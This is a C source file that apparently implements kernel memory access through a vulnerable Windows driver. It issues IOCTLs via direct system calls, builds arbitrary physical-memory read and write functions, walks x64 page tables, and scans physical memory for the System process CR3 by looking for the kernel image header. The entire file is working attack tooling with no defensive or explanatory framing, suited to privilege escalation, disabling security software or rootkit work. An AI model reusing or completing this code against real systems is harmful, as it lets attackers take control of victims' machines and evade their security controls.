#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "physmem.h"

static NTSTATUS SendIoctl(
    HANDLE device, SyscallTable* sc,
    ULONG code,
    void* inBuf, ULONG inSize,
    void* outBuf, ULONG outSize
) {
    IO_STATUS_BLOCK ioStatus = {};
    return (NTSTATUS)DoSyscallEx(
        sc->NtDeviceIoControlFile,
        (ULONG_PTR)device,
        (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)code,
        (ULONG_PTR)inBuf, (ULONG_PTR)inSize,
        (ULONG_PTR)outBuf, (ULONG_PTR)outSize,
        0
    );
}

// driver returns truncated 32-bit mapped address on x64
static void* ResolveFullAddress(DWORD truncatedAddr) {
    for (ULONG64 high = 0; high < 0x800; high++) {
        ULONG_PTR testAddr = (ULONG_PTR)((high << 32) | (ULONG64)truncatedAddr);
        MEMORY_BASIC_INFORMATION mbi = {};
        if (VirtualQuery((void*)testAddr, &mbi, sizeof(mbi)) > 0) {
            if (mbi.State == MEM_COMMIT && (ULONG_PTR)mbi.BaseAddress == testAddr)
                return (void*)testAddr;
        }
    }
    return NULL;
}

void* PhysMap(HANDLE device, SyscallTable* sc, ULONG64 physAddr, ULONG size) {
    MapPhysInput input = {};
    input.physicalAddress = physAddr;
    input.size = size;

    DWORD mappedLow = 0;
    NTSTATUS status = SendIoctl(device, sc, IOCTL_MAP_PHYS,
        &input, sizeof(input), &mappedLow, sizeof(mappedLow));

    if (status != 0 || mappedLow == 0)
        return NULL;
    return ResolveFullAddress(mappedLow);
}

void PhysUnmap(HANDLE device, SyscallTable* sc, void* mappedAddr) {
    if (!mappedAddr) return;
    UnmapPhysInput input = {};
    input.mappedAddress = (ULONG64)mappedAddr;
    SendIoctl(device, sc, IOCTL_UNMAP_PHYS, &input, sizeof(input), NULL, 0);
}

ULONG64 PhysRead64(HANDLE device, SyscallTable* sc, ULONG64 physAddr) {
    ULONG64 pageBase = physAddr & ~0xFFFULL;
    ULONG offset = (ULONG)(physAddr & 0xFFF);
    void* mapped = PhysMap(device, sc, pageBase, 0x1000);
    if (!mapped) return 0;
    ULONG64 value = *(ULONG64*)((BYTE*)mapped + offset);
    PhysUnmap(device, sc, mapped);
    return value;
}

ULONG PhysRead32(HANDLE device, SyscallTable* sc, ULONG64 physAddr) {
    ULONG64 pageBase = physAddr & ~0xFFFULL;
    ULONG offset = (ULONG)(physAddr & 0xFFF);
    void* mapped = PhysMap(device, sc, pageBase, 0x1000);
    if (!mapped) return 0;
    ULONG value = *(ULONG*)((BYTE*)mapped + offset);
    PhysUnmap(device, sc, mapped);
    return value;
}

bool PhysReadBuffer(HANDLE device, SyscallTable* sc, ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* dst = (BYTE*)buffer;
    ULONG remaining = size;
    ULONG64 cur = physAddr;

    while (remaining > 0) {
        ULONG64 pageBase = cur & ~0xFFFULL;
        ULONG off = (ULONG)(cur & 0xFFF);
        ULONG chunk = 0x1000 - off;
        if (chunk > remaining) chunk = remaining;

        void* mapped = PhysMap(device, sc, pageBase, 0x1000);
        if (!mapped) return false;
        memcpy(dst, (BYTE*)mapped + off, chunk);
        PhysUnmap(device, sc, mapped);

        dst += chunk;
        cur += chunk;
        remaining -= chunk;
    }
    return true;
}

bool PhysWrite64(HANDLE device, SyscallTable* sc, ULONG64 physAddr, ULONG64 value) {
    ULONG64 pageBase = physAddr & ~0xFFFULL;
    ULONG offset = (ULONG)(physAddr & 0xFFF);
    void* mapped = PhysMap(device, sc, pageBase, 0x1000);
    if (!mapped) return false;
    *(ULONG64*)((BYTE*)mapped + offset) = value;
    PhysUnmap(device, sc, mapped);
    return true;
}

bool PhysWriteBuffer(HANDLE device, SyscallTable* sc, ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* src = (BYTE*)buffer;
    ULONG remaining = size;
    ULONG64 cur = physAddr;

    while (remaining > 0) {
        ULONG64 pageBase = cur & ~0xFFFULL;
        ULONG off = (ULONG)(cur & 0xFFF);
        ULONG chunk = 0x1000 - off;
        if (chunk > remaining) chunk = remaining;

        void* mapped = PhysMap(device, sc, pageBase, 0x1000);
        if (!mapped) return false;
        memcpy((BYTE*)mapped + off, src, chunk);
        PhysUnmap(device, sc, mapped);

        src += chunk;
        cur += chunk;
        remaining -= chunk;
    }
    return true;
}

ULONG64 VirtToPhys(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 virtualAddr) {
    const ULONG64 ADDR_MASK = 0x000FFFFFFFFFF000ULL;

    ULONG64 pml4i = (virtualAddr >> 39) & 0x1FF;
    ULONG64 pdpti = (virtualAddr >> 30) & 0x1FF;
    ULONG64 pdi   = (virtualAddr >> 21) & 0x1FF;
    ULONG64 pti   = (virtualAddr >> 12) & 0x1FF;
    ULONG64 offset = virtualAddr & 0xFFF;

    ULONG64 pml4e = PhysRead64(device, sc, (cr3 & ADDR_MASK) + pml4i * 8);
    if (!(pml4e & 1)) return 0;

    ULONG64 pdpte = PhysRead64(device, sc, (pml4e & ADDR_MASK) + pdpti * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);

    ULONG64 pde = PhysRead64(device, sc, (pdpte & ADDR_MASK) + pdi * 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);

    ULONG64 pte = PhysRead64(device, sc, (pde & ADDR_MASK) + pti * 8);
    if (!(pte & 1)) return 0;

    return (pte & ADDR_MASK) + offset;
}

ULONG64 FindSystemCr3(HANDLE device, SyscallTable* sc, ULONG64 ntoskrnlBase) {
    ULONG64 kernelPml4Idx = (ntoskrnlBase >> 39) & 0x1FF;
    const ULONG64 ADDR_MASK = 0x000FFFFFFFFFF000ULL;

    printf("[*] Scanning for System CR3...\n");

    ULONG64 scanEnd = 0x10000000;
    int checked = 0;

    for (ULONG64 candidate = 0x1000; candidate < scanEnd; candidate += 0x1000) {
        checked++;
        if (checked % 8192 == 0)
            printf("[*]   %d pages\n", checked);

        ULONG64 kernelEntry = PhysRead64(device, sc, candidate + kernelPml4Idx * 8);
        if ((kernelEntry & 0x27) != 0x23)
            continue;

        BYTE page[4096];
        if (!PhysReadBuffer(device, sc, candidate, page, 4096))
            continue;

        ULONG64* entries = (ULONG64*)page;
        ULONG64 candidatePfn = candidate >> 12;

        for (int i = 256; i < 512; i++) {
            if (!(entries[i] & 1)) continue;
            if (((entries[i] & ADDR_MASK) >> 12) == candidatePfn) {
                ULONG64 ntPhys = VirtToPhys(device, sc, candidate, ntoskrnlBase);
                if (!ntPhys) break;
                if ((USHORT)PhysRead32(device, sc, ntPhys) != 0x5A4D) break;

                printf("[+] System CR3: 0x%llX (%d pages)\n", candidate, checked);
                return candidate;
            }
        }
    }
    return 0;
}
